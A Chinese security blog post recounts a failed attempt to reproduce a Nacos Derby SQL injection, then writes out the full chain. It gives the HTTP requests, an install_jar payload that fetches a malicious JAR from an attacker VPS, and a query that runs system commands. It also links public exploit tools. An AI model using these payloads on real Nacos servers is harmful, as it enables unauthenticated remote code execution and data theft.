#  记一次失败的挖洞经历，Nacos Derby SQL Injection复现流程  
原创 是老A
                    是老A  老A搞安全   2026-09-22 23:54  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/G9k4hwPicmFTYWcJX6fMuPvIFRTtvy54pczjcLGIvVrFJYqSOg5qVFET4McibFKib8SGP2AltBQ5o5pZx1I1ib3dYc4rJ2qfW51R9bWUK2SgGdo/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/G9k4hwPicmFTOx6kuFvZrMy4YD9Micn48qwKtxYbsQHGiaevymH5aSicn5pIuepR1Ae0eHlWGicYfia16VaEyuIVrHBQK5RNibyCN93NWou5rYaWL0/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/G9k4hwPicmFT94SmvOZ27C1vmxwY9osD4Sibeh9DUz0mkC4IJ1RFKMZnAGQvh11uV7dw9fuap2jHn9QVGX15WjgLGzBuT79RZz3wgev8UunJY/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/G9k4hwPicmFT1EnN2o0mk1icZm5QTb3OiacRHPicLQtBxgmXUmL031ia6SLLrZaNZHPDEpJfnJokAjhKQW3yQsrHJmf6NiclSSGJGj6BGicdpbO8r0/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/G9k4hwPicmFQjbSfEH2tkD1Ekgn41bZ84XHlZedJFLB8c9RtMKZEvTLNISY8un65tgUc1Oh93bge7gP5IJXK5EwQ6LXxeeyKoMHEqmtXUfvo/640?wx_fmt=jpeg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/G9k4hwPicmFQqlDsCWXib4vEq0MFwicPQicKMq5IibD8TdTZhfksa6k30jTiaDRdKnoBvS5ib9VqnmmqARyQia39LyN516nMuVftow6xXflV6ulOgP4/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/G9k4hwPicmFRuc19t3XqkgzJWbFkJYjA0HlZUgIficPY1y5wvTia5wH4OwWUYVtp8ib1a2fyVKDVCNV5bPzouhic1AE58aCw3IiaCCrHR9XYIRB5M/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/G9k4hwPicmFRtgnzFsZTzlqDL8M8Q3JgFpggcu9TiaSW9xejFEFFeujpXnbnjRJiaA3BNiaEnacGqcHyIZfu3VrvwDGYOhmSQaAEMwMTCNzelX8/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/G9k4hwPicmFQNEhxjEX18NOicXYYpLwGJxqsD5A5ME06PzVtLG31Rx7ZTP01BxlGYwxNnHNeKKD1iavqPqEkZCQBob0UMjGgCy7VFRFJHtT5kI/640?wx_fmt=png&from=appmsg "")  
  
一位深耕网络安全的老兵，目前是一家安全公司的技术分管，擅长渗透测试及安全培训方向，老A的愿望是大家没烦恼，一切顺心！  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/G9k4hwPicmFRNXib9zjjZPZejPjBwibx9QT7IvAiayelNF3epDdrziaLAqssSxNIl1T8JUPsMBGXMzIV9qRymokjJB2C6KSrwRKVRaCrmicZzicNes/640?wx_fmt=png&from=appmsg "")  
  
  
漏洞工具分享：  
```
NacosExploit（命令行版）：https://github.com/h0ny/NacosExploit
NacosExploitGUI（图形化版）：https://github.com/charonlight/NacosExploitGUI
```  
  
  
Nacos Derby SQL Injection  
漏洞前置条件确认  
  
  
1、版本要求：Nacos <= 2.4.0-BETA  
  
  
2、  
存储模式：必须使用内置 Derby 数据库  
  
  
3、  
鉴权状态：需要未开启鉴权（auth_enabled=false）  
  
  
复现过程（bp手工复测）：  
  
  
第一步：探测注入点  
```
GET /nacos/v1/cs/ops/derby?sql=select%20%2a%20from%20users HTTP/1.1
Host: <target>:8848
```  
  
  
如果返回用户表数据（用户名、密码哈希），说明注入点有效。这一步是最低成本验证  
  
  
但我遇到的情况是，  
Nacos 的存储模式不是 Derby，因此该漏洞无法在此目标上复现成功！  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/G9k4hwPicmFREBpfnerWz9ExvicGdp2MQWuZopU4vgbvibwGHyxdkUMnfTtSicqlsOcbtIUbz0dXREI0WpEwN73CJoFqU18I68ico5MYibRzHBUA4/640?wx_fmt=png&from=appmsg "")  
  
#### 理想情况下第二步：通过 removal 接口写入恶意 SQL  
  
  
换一个 POST 请求，打  
  
/nacos/v1/cs/ops/data/removal和multipart/form-data  
 格式，  
  
file 参数的值就是我们要注入的 SQL：  
  
```
CALL sqlj.install_jar('http://<your-vps>/evil.jar', 'NACOS.xxxxxxxx', 0)
CALL SYSCS_UTIL.SYSCS_SET_DATABASE_PROPERTY('derby.database.classpath','NACOS.xxxxxxxx')
CREATE FUNCTION S_EXAMPLE_xxxxxxxx( PARAM VARCHAR(2000)) RETURNS VARCHAR(2000) PARAMETER STYLE JAVA NO SQL LANGUAGE JAVA EXTERNAL NAME 'test.poc.Example.exec'
```  
  
  
注：install_jar  
 把恶意 JAR 装进 Derby 的 SYS.SYSFILES  
 系统表，SET_DATABASE_PROPERTY  
 设置 Derby 类路径让引擎能加载它，CREATE FUNCTION  
 把 JAR 里的 exec  
 方法映射成一个可以调用的数据库函数  
  
  
xxxxxxxx  
 换成随机 8 位字符串，evil.jar  
 是你自己编译的恶意类，Java 代码就一个静态 exec 方法执行传入参数即可  
  
#### 第三步：通过 derby 接口触发命令  
  
  
回到 derby 接口，调用刚创建的函数：  
  
```
GET /nacos/v1/cs/ops/derby?sql=select%20%2a%20from%20(select%20count(%2a)%20as%20b%2c%20S_EXAMPLE_xxxxxxxx('whoami')%20as%20a%20from%20config_info)%20tmp%20%2f%2aROWS%20FETCH%20NEXT%2a%2f HTTP/1.1
```  
  
  
解码后的 SQL：  
```
select * from (select count(*) as b, S_EXAMPLE_xxxxxxxx('whoami') as a from config_info) tmp /*ROWS FETCH NEXT*/
```  
  
  
这里的 /*ROWS FETCH NEXT*/  
 注释是为了绕过 Nacos 对结果集的限制逻辑  
。命令回显可以在 Burp 的 Response 里看到  
  
  
⚠️ 法律声明：以上内容仅供安全学习和授权测试使用。未经授权的漏洞利用属于违法行为，请勿对未经授权的目标进行测试  
  
  
